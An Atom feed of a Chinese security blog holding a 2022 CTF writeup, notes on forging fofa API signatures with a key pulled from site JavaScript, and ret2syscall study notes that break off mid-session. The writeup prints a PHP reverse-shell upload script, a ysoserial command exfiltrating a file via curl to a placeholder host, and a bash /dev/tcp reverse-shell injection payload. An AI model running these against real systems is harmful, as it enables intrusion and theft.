<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RinkoQwQ&#39;s blog</title>
  
  <subtitle>nya</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-09-26T06:41:37.479Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>RinkoQwQ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>黑盾杯2022线上writeup</title>
    <link href="http://example.com/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/"/>
    <id>http://example.com/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/</id>
    <published>2022-09-26T06:27:05.000Z</published>
    <updated>2022-09-26T06:41:37.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Do-you-secure"><a href="#Do-you-secure" class="headerlink" title="Do you secure"></a><strong><em>Do you secure</em></strong></h2><p>dirsearch扫到upload.php</p><p>条件竞争</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;pic&#x27;</span>:(<span class="string">&#x27;ma.php&#x27;</span>, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$sock = fsockopen(&quot;xxx&quot;, &quot;9999&quot;);</span></span><br><span class="line"><span class="string">$descriptorspec = array(</span></span><br><span class="line"><span class="string">     0 =&gt; $sock,</span></span><br><span class="line"><span class="string">     1 =&gt; $sock,</span></span><br><span class="line"><span class="string">     2 =&gt; $sock</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">$process = proc_open(&#x27;/bin/sh&#x27;, $descriptorspec, $pipes);</span></span><br><span class="line"><span class="string">proc_close($process);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&quot;http://39.104.68.128:24430/upload.php&quot;</span>,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">res = r.text[r.text.find(<span class="string">&quot;/upload/&quot;</span>):r.text.find(<span class="string">&quot;&lt;br&gt;&quot;</span>)]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">r = requests.get(<span class="string">&quot;http://39.104.68.128:24430&quot;</span>+res)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure> <span id="more"></span><p>获得反弹shell，拿到flag</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/1.png" alt="img"> </p><h2 id="the-word-is-not-the-word"><a href="#the-word-is-not-the-word" class="headerlink" title="the word is not the word"></a><strong><em>the word is not the word</em></strong></h2><p>将doc文件命名为.zip文件</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/2.png" alt="img"> </p><p>解压后<img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/3.png" alt="img"></p><p>打开word目录下的document.xml</p><p>在文件末尾发现类似flag用{}包裹字符串</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/4.png" alt="img"> </p><h2 id="看不见不等于没有"><a href="#看不见不等于没有" class="headerlink" title="看不见不等于没有"></a><strong><em>看不见不等于没有</em></strong></h2><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/5.png" alt="img"> </p><p>转为16进制，发现全部都是20和09，猜测为二进制编码</p><p>将20和09分别替换成0和1，解码获得flag</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/6.png" alt="img"> </p><h2 id="HeidunGame"><a href="#HeidunGame" class="headerlink" title="HeidunGame"></a><strong><em>HeidunGame</em></strong></h2><p>使用d2j-dex2jar,得到classes-dex2jar.jar，用JD-GUI打开</p><p>在com.example.heidungame.data.LoginDataSource找到flag</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/7.png" alt="img"> </p><h2 id="EzJava"><a href="#EzJava" class="headerlink" title="EzJava"></a><strong><em>EzJava</em></strong></h2><p>扫到 <a href="http://39.104.68.128:8301/login">http://39.104.68.128:8301/login</a> ，访问提示/json，访问/json又跳回login</p><p>附件是个pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>shiro1.5.1版本存在权限绕过漏洞CVE-2020-11989，访问/aaaa/..;/json成功绕过</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/8.png" alt="img"> </p><p>fuzz发现可能存在Jackson反序列化</p><p>使用jndi注入rce，getshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 2334 CommonsCollections5 <span class="string">&quot;curl xxx:9999 -F file=@/flag.txt&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/9.png" alt="img"> </p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/10.png" alt="img"> </p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/11.png" alt="img"> </p><h2 id="ezwebweb"><a href="#ezwebweb" class="headerlink" title="ezwebweb"></a><strong><em>ezwebweb</em></strong></h2><p>在 <a href="http://39.104.68.128:5748/index/feedBack">http://39.104.68.128:5748/index/feedBack</a> 抓包发现 /validateBody</p><p>CVE-2020-11989</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/12.png" alt="img"> </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/validateBody</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.104.68.128:5748</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>196</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39.104.68.128:5748</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39.104.68.128:5748/index/feedBack</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=53641AF424B14F49A193187416A5214C</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"> </span><br><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;tel&quot;:&quot;1&quot;,&quot;email&quot;:&quot;$\\A&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethods()[6].invoke(null).exec(&#x27;/bin/bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/xxx/9999&lt;&amp;1&#x27;)&#125;&quot;,&quot;yourworks&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>反弹shell拿到flag</p><p><img src="/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/13.png" alt="img"> </p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Do-you-secure&quot;&gt;&lt;a href=&quot;#Do-you-secure&quot; class=&quot;headerlink&quot; title=&quot;Do you secure&quot;&gt;&lt;/a&gt;&lt;strong&gt;&lt;em&gt;Do you secure&lt;/em&gt;&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;dirsearch扫到upload.php&lt;/p&gt;
&lt;p&gt;条件竞争&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;files = &amp;#123;&lt;span class=&quot;string&quot;&gt;&amp;#x27;pic&amp;#x27;&lt;/span&gt;:(&lt;span class=&quot;string&quot;&gt;&amp;#x27;ma.php&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;$sock = fsockopen(&amp;quot;xxx&amp;quot;, &amp;quot;9999&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;$descriptorspec = array(&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;     0 =&amp;gt; $sock,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;     1 =&amp;gt; $sock,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;     2 =&amp;gt; $sock&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;$process = proc_open(&amp;#x27;/bin/sh&amp;#x27;, $descriptorspec, $pipes);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;proc_close($process);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;image/png&amp;#x27;&lt;/span&gt;)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = requests.post(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://39.104.68.128:24430/upload.php&amp;quot;&lt;/span&gt;,files=files)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;res = r.text[r.text.find(&lt;span class=&quot;string&quot;&gt;&amp;quot;/upload/&amp;quot;&lt;/span&gt;):r.text.find(&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(res)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://39.104.68.128:24430&amp;quot;&lt;/span&gt;+res)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>fofa API 签名逆向</title>
    <link href="http://example.com/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/"/>
    <id>http://example.com/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/</id>
    <published>2021-07-21T02:50:00.000Z</published>
    <updated>2022-07-21T03:30:14.247Z</updated>
    
    <content type="html"><![CDATA[<p>某天准备用自己抓包写的脚本爬一些fofa上的数据时，发现出错了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: -9,</span><br><span class="line">  &quot;message&quot;: &quot;[-9] API校验密匙错&quot;,</span><br><span class="line">  &quot;data&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过抓包，发现请求多了<code>ts</code>  <code>sign</code>  <code>app_id</code> 三个参数，关键是<code>sign</code></p><p><img src="/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/image-20220509220709783.png"><br> <span id="more"></span></p><p>尝试通过追踪请求的调用栈和搜索关键词，在webpack js源码中找到签名的代码</p><p><img src="/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/image-20220509221214758.png"></p><p>发现这里有一串RSA private key，调用sortFun进行签名</p><p>找到sortFun</p><p><img src="/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/image-20220509221521260.png"> </p><p>对代码进行修改以方便调试和查看效果</p><p><img src="/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/image-20220509221650316.png"> </p><p><img src="/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/image-20220509221843541.png"> </p><p><img src="/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/image-20220509221937552.png"></p><p>可以看到签名的字符串是把url中的所有参数和值拼接在一起</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;fullfalseqbase64cHJvdG9jb2w9Imh0dHAits1652105964318&quot;</span> | openssl dgst -sha256 -sign fofa_rsa.pem | <span class="built_in">base64</span></span><br><span class="line">X2gz9o3GrWhKim51dO5QB0nz2XJLCCP5T9jJxn3TXZH7NLNy75enVvb8JMoIbCJuEuoM1HdI6nd2</span><br><span class="line">YdGn7Ag26lnZoUNQy/4l+0ff66mvaxl+iidthKV/MaINvFSewlteGCzwekx0IbiOS4HABmOBCfqG</span><br><span class="line">2HzAb+Eqo/olWoDcNmJSaW9f4f1W0bpQNoB9XCHL5Jsq89AwG/5hrbdKXCZu93f9sFdHszw7kZGQ</span><br><span class="line">kqBgPm/SJ7hJnukCMWBB6GF7eotOGx524RMGO/LKiDBb9g3dUNGa4H1op6AW5WpaeRQT2CPTpjLk</span><br><span class="line">qVZYaG7bO6t2zO3ltcg6ajTIplVfgtIbu/ZvqQ==</span><br></pre></td></tr></table></figure><p>验证成功</p><p>py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qbase64 = base64.b64encode(q.encode()).decode()</span><br><span class="line">for_sign = <span class="string">&quot;fullfalsepage%sq%sqbase64%ssize10&quot;</span>%(i,q,qbase64)</span><br><span class="line">sign = urllib.parse.quote(base64.b64encode(rsa.sign_hash(rsa.compute_hash(for_sign.encode(), <span class="string">&#x27;SHA-256&#x27;</span>), privkey, <span class="string">&#x27;SHA-256&#x27;</span>)).decode(),safe=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;某天准备用自己抓包写的脚本爬一些fofa上的数据时，发现出错了&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;quot;code&amp;quot;: -9,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;quot;message&amp;quot;: &amp;quot;[-9] API校验密匙错&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;quot;data&amp;quot;: &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;经过抓包，发现请求多了&lt;code&gt;ts&lt;/code&gt;  &lt;code&gt;sign&lt;/code&gt;  &lt;code&gt;app_id&lt;/code&gt; 三个参数，关键是&lt;code&gt;sign&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/image-20220509220709783.png&quot;&gt;&lt;br&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>syscall&amp;ret2syscall学习笔记</title>
    <link href="http://example.com/2021/01/16/syscall-ret2syscall%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/01/16/syscall-ret2syscall%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-01-16T02:44:13.000Z</published>
    <updated>2021-01-16T05:19:40.180Z</updated>
    
    <content type="html"><![CDATA[<p>使用checksec检查保护</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec rop </span><br><span class="line">[*] <span class="string">&#x27;rop&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>丢进IDA查看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <a id="more"></a><p>使用GEF计算偏移量</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">gdb -q rop  </span><br><span class="line">Reading symbols from rop...</span><br><span class="line">gdb-peda$ pattern create 200</span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/qwq/pwn/rop </span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What <span class="keyword">do</span> you plan to <span class="keyword">do</span>?</span><br><span class="line">AAA%AAsAABAA<span 